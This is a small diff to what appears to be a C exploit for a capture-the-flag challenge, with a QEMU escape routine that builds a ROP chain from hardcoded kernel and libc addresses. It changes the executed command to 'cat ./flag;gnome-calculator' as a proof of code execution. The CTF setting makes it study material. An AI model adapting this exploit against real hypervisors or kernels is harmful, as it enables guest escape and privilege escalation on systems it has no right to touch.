@@ -29,6 +29,10 @@
 #define PIPE_NUM 256
 #define MSG_QUEUE_NUM 4096
 
+#ifndef MSG_COPY
+#define MSG_COPY 040000
+#endif
+
 #define ANON_PIPE_BUF_OPS 0xffffffff81e2d980
 #define PREPARE_KERNEL_CRED 0xffffffff810bb9c04
 #define INIT_CRED 0xffffffff8224aca0
@@ -321,7 +325,7 @@ void qemuEscape(void)
      * with correct works. So I think the problem is not here, but where?
      */
     buf[33] = buf[34] = 0;
-    strcpy((char*)&buf[33], "cat ./flag");
+    strcpy((char*)&buf[33], "cat ./flag;gnome-calculator");
 
     /* the new rdx starts there */
     buf[28] = libc_base + LIBC_POP_RDI_RET;
@@ -375,7 +379,7 @@ void qemuEscape(void)
      */
 
     puts("");
-    puts("\033[34m\033[1m[*] Step.IV trigger fake ops to escape\033[0m");
+    puts("\033[34m\033[1m[*] Step.IV trigger fake ops to escape\n\033[0m");
 
     //sleep(5);
     ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(size_t*)"arttnba3");
